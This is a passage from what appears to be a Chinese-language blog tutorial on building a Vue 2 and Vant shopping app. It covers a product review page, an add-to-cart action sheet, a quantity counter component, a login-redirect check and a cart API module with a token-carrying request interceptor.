class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="goodsEvaluation"&gt;</span><br><span class="line">    &lt;van-nav-bar</span><br><span class="line">      fixed</span><br><span class="line">      title="商品评价页"</span><br><span class="line">      left-arrow</span><br><span class="line">      @click-left="$router.go(-1)"</span><br><span class="line">    /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class="comment-list"&gt;</span><br><span class="line">      &lt;div</span><br><span class="line">        class="comment-item"</span><br><span class="line">        v-for="item in goodsCommentArray"</span><br><span class="line">        :key="item.comment_id"</span><br><span class="line">      &gt;</span><br><span class="line">        &lt;div class="top"&gt;</span><br><span class="line">          &lt;img :src="item.user.avatar_url || defaultAvatar" alt="" /&gt;</span><br><span class="line">          &lt;div class="name"&gt;{{ item.user.nick_name }}&lt;/div&gt;</span><br><span class="line">          &lt;van-rate</span><br><span class="line">            :size="16"</span><br><span class="line">            :value="item.score"</span><br><span class="line">            color="#ffd21e"</span><br><span class="line">            void-icon="star"</span><br><span class="line">            void-color="#eee"</span><br><span class="line">          /&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="content"&gt;</span><br><span class="line">          {{ item.content }}</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="time"&gt;</span><br><span class="line">          {{ item.create_time }}</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import { getGoodsCommentDetail } from "@/api/goodsDetail";</span><br><span class="line">export default {</span><br><span class="line">  name: "GoodsEvaluation",</span><br><span class="line">  computed: {</span><br><span class="line">    detailId() {</span><br><span class="line">      return this.$route.params.id;</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">  async created() {</span><br><span class="line">    try {</span><br><span class="line">      const goodsId = this.detailId;</span><br><span class="line">      const commentRes = await getGoodsCommentDetail({</span><br><span class="line">        scoreType: -1, // 全部评价</span><br><span class="line">        goodsId,</span><br><span class="line">      });</span><br><span class="line">      this.goodsCommentArray = commentRes.data.list.data;</span><br><span class="line">      console.log(this.goodsCommentArray);</span><br><span class="line">    } catch (error) {</span><br><span class="line">      console.error("Failed to fetch goods comments:", error);</span><br><span class="line">      // 可以在这里添加更多的错误处理逻辑，比如显示错误提示</span><br><span class="line">    }</span><br><span class="line">  },</span><br><span class="line">  data() {</span><br><span class="line">    return {</span><br><span class="line">      defaultAvatar: "https://.../coding/202408301648039.png",</span><br><span class="line">      goodsCommentArray: [], // 商品评价</span><br><span class="line">    };</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang="less" scoped&gt;</span><br><span class="line">.goodsEvaluation {</span><br><span class="line">  padding-top: 46px;</span><br><span class="line">  background-color: #f7f7f7;</span><br><span class="line">  min-height: 100vh;</span><br><span class="line">  ::v-deep .van-icon-arrow-left {</span><br><span class="line">    color: #333;</span><br><span class="line">  }</span><br><span class="line">  .comment-list {</span><br><span class="line">    padding: 10px 15px;</span><br><span class="line">  }</span><br><span class="line">  .comment-item {</span><br><span class="line">    background-color: #fff;</span><br><span class="line">    border-radius: 8px;</span><br><span class="line">    padding: 15px;</span><br><span class="line">    margin-bottom: 10px;</span><br><span class="line">    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);</span><br><span class="line">    font-size: 14px;</span><br><span class="line">    line-height: 22px;</span><br><span class="line">    .top {</span><br><span class="line">      display: flex;</span><br><span class="line">      align-items: center;</span><br><span class="line">      margin-bottom: 10px;</span><br><span class="line">      img {</span><br><span class="line">        width: 40px;</span><br><span class="line">        height: 40px;</span><br><span class="line">        border-radius: 50%;</span><br><span class="line">        margin-right: 10px;</span><br><span class="line">        object-fit: cover;</span><br><span class="line">        border: 1px solid #eaeaea;</span><br><span class="line">      }</span><br><span class="line">      .name {</span><br><span class="line">        font-weight: 600;</span><br><span class="line">        color: #333;</span><br><span class="line">        flex-grow: 1;</span><br><span class="line">      }</span><br><span class="line">      .van-rate {</span><br><span class="line">        margin-left: auto;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    .content {</span><br><span class="line">      color: #555;</span><br><span class="line">      margin-bottom: 10px;</span><br><span class="line">      white-space: normal;</span><br><span class="line">      word-wrap: break-word;</span><br><span class="line">    }</span><br><span class="line">    .time {</span><br><span class="line">      font-size: 12px;</span><br><span class="line">      color: #999;</span><br><span class="line">      text-align: right;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><p>并转到 router 包下修改路由：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 配置动态商品id，用于确认将来是哪个商品详情页</span></span><br><span class="line">{ <span class="attr">path</span>: <span class="string">'/productdetail/:id'</span>, <span class="attr">component</span>: <span class="title class_">ProductDetail</span> },</span><br><span class="line">{ <span class="attr">path</span>: <span class="string">'/evaluation/:id'</span>, <span class="attr">component</span>: <span class="title class_">GoodsEvaluation</span> },</span><br><span class="line"></span><br><span class="line"><span class="comment">// 404页面，用于调试</span></span><br><span class="line">{ <span class="attr">path</span>: <span class="string">'*'</span>, <span class="attr">component</span>: <span class="title class_">NotFound</span> }</span><br></pre></td></tr></tbody></table></figure><h2 id="加入购物车购买"><a class="markdownIt-Anchor" href="#加入购物车购买"></a> 加入购物车 / 购买</h2><p>该功能使用到弹层组件，可以在 vant 组件库中找到 ActionSheet</p><p>页面代码如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 弹层 --&gt;</span><br><span class="line">&lt;van-action-sheet</span><br><span class="line">  v-model="showPannel"</span><br><span class="line">  :title="mode === 'cart' ? '加入购物车' : '立刻购买'"</span><br><span class="line">&gt;</span><br><span class="line">      &lt;div class="product"&gt;</span><br><span class="line">        &lt;div class="product-title"&gt;</span><br><span class="line">          &lt;div class="left"&gt;</span><br><span class="line">            &lt;img :src="goodsDetailObj.goods_image" alt=""&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">          &lt;div class="right"&gt;</span><br><span class="line">            &lt;div class="price"&gt;</span><br><span class="line">              &lt;span&gt;¥&lt;/span&gt;</span><br><span class="line">              &lt;span class="nowprice"&gt;{{ goodsDetailObj.goods_price_min }}&lt;/span&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div class="count"&gt;</span><br><span class="line">              &lt;span&gt;库存&lt;/span&gt;</span><br><span class="line">              &lt;span&gt;{{ goodsDetailObj.stock_total }}&lt;/span&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="num-box"&gt;</span><br><span class="line">          &lt;span&gt;数量&lt;/span&gt;</span><br><span class="line">          数字框占位</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;!-- 有库存才显示可购买 --&gt;</span><br><span class="line">        &lt;div class="showbtn" v-if="goodsDetailObj.stock_total &gt; 0"&gt;</span><br><span class="line">          &lt;div class="btn" v-if="true"&gt;加入购物车&lt;/div&gt;</span><br><span class="line">          &lt;div class="btn now" v-else&gt;立刻购买&lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="btn-none" v-else&gt;该商品已抢完&lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/van-action-sheet&gt;</span><br></pre></td></tr></tbody></table></figure><p>样式如下：</p><figure class="highlight less"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 弹层样式</span></span><br><span class="line"><span class="selector-class">.product</span> {</span><br><span class="line">  <span class="selector-class">.product-title</span> {</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="selector-class">.left</span> {</span><br><span class="line">      <span class="selector-tag">img</span> {</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">90px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">90px</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="selector-class">.right</span> {</span><br><span class="line">      <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">      <span class="attribute">padding</span>: <span class="number">10px</span>;</span><br><span class="line">      <span class="selector-class">.price</span> {</span><br><span class="line">        <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">        <span class="attribute">color</span>: <span class="number">#fe560a</span>;</span><br><span class="line">        <span class="selector-class">.nowprice</span> {</span><br><span class="line">          <span class="attribute">font-size</span>: <span class="number">24px</span>;</span><br><span class="line">          <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.num-box</span> {</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>: space-between;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.btn</span>,</span><br><span class="line">  <span class="selector-class">.btn-none</span> {</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">40px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">40px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">148</span>, <span class="number">2</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="selector-class">.btn</span><span class="selector-class">.now</span> {</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#fe5630</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="selector-class">.btn-none</span> {</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#cccccc</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>data 中提供两个数据：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">showPannel</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">mode</span>: <span class="string">'cart'</span>, <span class="comment">// 购物车或立即购买</span></span><br></pre></td></tr></tbody></table></figure><p>methods 中提供两个方法：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">addToCart</span> () {</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">showPannel</span> = <span class="literal">true</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">mode</span> = <span class="string">'cart'</span></span><br><span class="line">    },</span><br><span class="line">    <span class="title function_">buyNow</span> () {</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">showPannel</span> = <span class="literal">true</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">mode</span> = <span class="string">'buy'</span></span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>接下来还需要将弹层中的数量展示封装成数字框组件。</p><h2 id="数字框组件封装"><a class="markdownIt-Anchor" href="#数字框组件封装"></a> 数字框组件封装</h2><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408310106195.png" alt="image-20240831010611047"><br>分析：组件名 CountBox</p><ol><li>静态结构，左中右三部分</li><li>数字框的数字，应该是外部传递进来的 (父传子)</li><li> 点击 <code>+－</code>号，可以修改数字（子传父)</li><li> 使用 <code>v-model</code> 实现封装（<code>:value</code> 和 <code>@input</code> 的简写）</li><li>数字不能减到小于 1</li></ol><p>封装组件 <code>components/CountBox.vue</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="count-box"&gt;</span><br><span class="line">    &lt;button @click="handleSub" class="minus"&gt;-&lt;/button&gt;</span><br><span class="line">    &lt;input :value="value" @change="handleChange" class="inp" type="text" /&gt;</span><br><span class="line">    &lt;button @click="handleAdd" class="add"&gt;+&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default {</span><br><span class="line">  props: {</span><br><span class="line">    value: {</span><br><span class="line">      type: Number,</span><br><span class="line">      default: 1,</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">  methods: {</span><br><span class="line">    handleSub() {</span><br><span class="line">      if (this.value &lt;= 1) {</span><br><span class="line">        return;</span><br><span class="line">      }</span><br><span class="line">      this.$emit("input", this.value - 1);</span><br><span class="line">    },</span><br><span class="line">    handleAdd() {</span><br><span class="line">      this.$emit("input", this.value + 1);</span><br><span class="line">    },</span><br><span class="line">    handleChange(e) {</span><br><span class="line">      // console.log(e.target.value)</span><br><span class="line">      const num = +e.target.value; // 转数字处理 (1) 数字 (2) NaN</span><br><span class="line"></span><br><span class="line">      // 输入了不合法的文本 或 输入了负值，回退成原来的 value 值</span><br><span class="line">      if (isNaN(num) || num &lt; 1) {</span><br><span class="line">        e.target.value = this.value;</span><br><span class="line">        return;</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      this.$emit("input", num);</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang="less" scoped&gt;</span><br><span class="line">.count-box {</span><br><span class="line">  width: 110px;</span><br><span class="line">  display: flex;</span><br><span class="line">  .add,</span><br><span class="line">  .minus {</span><br><span class="line">    width: 30px;</span><br><span class="line">    height: 30px;</span><br><span class="line">    outline: none;</span><br><span class="line">    border: none;</span><br><span class="line">    background-color: #efefef;</span><br><span class="line">  }</span><br><span class="line">  .inp {</span><br><span class="line">    width: 40px;</span><br><span class="line">    height: 30px;</span><br><span class="line">    outline: none;</span><br><span class="line">    border: none;</span><br><span class="line">    margin: 0 5px;</span><br><span class="line">    background-color: #efefef;</span><br><span class="line">    text-align: center;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><p>使用组件</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">CountBox</span> <span class="keyword">from</span> <span class="string">'@/components/CountBox.vue'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> {</span><br><span class="line">  <span class="attr">name</span>: <span class="string">'ProDetail'</span>,</span><br><span class="line">  <span class="attr">components</span>: {</span><br><span class="line">    <span class="title class_">CountBox</span></span><br><span class="line">  },</span><br><span class="line">  <span class="title function_">data</span> () {</span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">      <span class="attr">addCount</span>: <span class="number">1</span></span><br><span class="line">      ...</span><br><span class="line">    }</span><br><span class="line">  },</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">"num-box"</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>数量<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">CountBox</span> <span class="attr">v-model</span>=<span class="string">"addCount"</span>&gt;</span><span class="tag">&lt;/<span class="name">CountBox</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="加入购物车-判断登录状态"><a class="markdownIt-Anchor" href="#加入购物车-判断登录状态"></a> 加入购物车 - 判断登录状态</h2><p>需要使用到 vant 的 Dialog 组件</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { <span class="title class_">Dialog</span> } <span class="keyword">from</span> <span class="string">"vant"</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Dialog</span>({ <span class="attr">message</span>: <span class="string">"提示"</span> });</span><br></pre></td></tr></tbody></table></figure><p>给弹层的加入购物车按钮绑定点击事件</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">"btn"</span> v-<span class="keyword">if</span>=<span class="string">"this.mode === 'cart'"</span> @click=<span class="string">"addCart"</span>&gt;加入购物车&lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><p>添加 token 鉴权判断，跳转携带回跳地址</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加入购物车判断登录状态</span></span><br><span class="line">    <span class="title function_">addCart</span> () {</span><br><span class="line">      <span class="comment">// console.log(this.$store.getters.token)</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">$store</span>.<span class="property">getters</span>.<span class="property">token</span>) {</span><br><span class="line">        <span class="comment">// 说明没有token，没有token就需要提示登录</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$dialog</span>.<span class="title function_">confirm</span>({</span><br><span class="line">          <span class="attr">message</span>: <span class="string">'当前操作需要登录后才能进行哦'</span>,</span><br><span class="line">          <span class="attr">confirmButtonText</span>: <span class="string">'去登录'</span>,</span><br><span class="line">          <span class="attr">cancelButtonText</span>: <span class="string">'再逛逛'</span></span><br><span class="line">        }).<span class="title function_">then</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">          <span class="comment">// 说明点击了去登录，需要带上backUrl</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">replace</span>({</span><br><span class="line">            <span class="attr">path</span>: <span class="string">'/login'</span>,</span><br><span class="line">            <span class="attr">query</span>: {</span><br><span class="line">              <span class="attr">backUrl</span>: <span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">fullPath</span> <span class="comment">// 带上当前页面的全路径（包括查询参数）</span></span><br><span class="line">            }</span><br><span class="line">          })</span><br><span class="line">        })</span><br><span class="line">          .<span class="title function_">catch</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">            <span class="comment">// 说明点击了再逛逛，不做任何操作</span></span><br><span class="line">          })</span><br><span class="line">      }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>登录后如果有回跳地址则 replace 地回跳回去：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断有无回跳地址</span></span><br><span class="line"><span class="keyword">const</span> url = <span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">query</span>.<span class="property">backUrl</span> || <span class="string">"/"</span>;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">replace</span>(url);</span><br></pre></td></tr></tbody></table></figure><h2 id="thisrouterreplace和thisrouterpush的区别"><a class="markdownIt-Anchor" href="#thisrouterreplace和thisrouterpush的区别"></a> <code>this.$router.replace</code> 和 <code>this.$router.push</code> 的区别</h2><p>假设有 A、B、C 三个页面。</p><p>我从 A 点击进入 B 页面，然后在 B 页面需要进行跳转到 C 页面，此时我触发的是 <code>this.$router.replace</code> 进行跳转，那么跳转到 C 之后 C 就会将 B 的访问记录完全覆盖。如果我在 C 页面的操作结束之后，进行返回上一页的操作，就会直接返回到 A 页面而不是 B 页面。</p><p>相对的，<code>this.$router.push</code> 则会将记录保持，你的每次访问都是一个累加的过程，不会清除。</p><p>如果把页面比作真实的纸张，跳转的过程就像把我们手里的一张纸覆盖到桌子上的另一张纸上面一样，桌子上纸张堆的是已经访问过的页面，桌子上的纸张堆中最上面那一张就是我们现在正在访问的页面，而手里的是将要访问的页面。但覆盖的方式上述两种各有不同：<code>replace</code> 会在覆盖桌子上的纸张之前将桌子上最上面的那一张丢到垃圾桶，然后再将手中的纸张覆盖上去；<code>push</code> 则是简单的将纸张放在桌子上的纸张上面，不进行其他任何操作，最终你的访问记录都在桌子上。</p><h2 id="加入购物车-封装接口进行请求"><a class="markdownIt-Anchor" href="#加入购物车-封装接口进行请求"></a> 加入购物车 - 封装接口进行请求</h2><p>接口如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408310106434.png" alt="image-20240830232641136"></p><p>封装加入购物车的请求接口模块 <code>api/cart.js</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加入购物车的请求</span></span><br><span class="line"><span class="keyword">import</span> request <span class="keyword">from</span> <span class="string">"@/utils/request"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">addCart</span> = (<span class="params">goodsId, goodsNum, goodsSkuId</span>) =&gt; {</span><br><span class="line">  <span class="comment">// goodsId: 商品id, goodsNum: 商品数量, goodsSkuId: 商品规格id 如红色手机</span></span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">post</span>(<span class="string">"/cart/add"</span>, {</span><br><span class="line">    goodsId,</span><br><span class="line">    goodsNum,</span><br><span class="line">    goodsSkuId,</span><br><span class="line">  });</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>由于需要携带请求头且携带的是鉴权信息，每次请求手动去写比较麻烦，所以直接在请求拦截器中携带 <code>utils/request.js</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">"@/store"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 只要有token就在请求中携带，便于请求需要权限的接口</span></span><br><span class="line"><span class="keyword">const</span> token = store.<span class="property">getters</span>.<span class="property">token</span>;</span><br><span class="line"><span class="keyword">if</span> (token) {</span><br><span class="line">  config.<span class="property">headers</span>[<span class="string">"Access-Token"</span>] = token;</span><br><span class="line">  config.<span class="property">headers</span>.<span class="property">platform</span> = <span class="string">"h5"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> config;</span><br></pre></td></tr></tbody></table></figure><p>修改购物车渲染代码进行购物车内数量角标展示 <code>views/productdetail/index.vue</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class="icon-cart"&gt;</span><br><span class="line">        &lt;van-icon :badge="cartTotal || ''" name="shopping-cart-o" 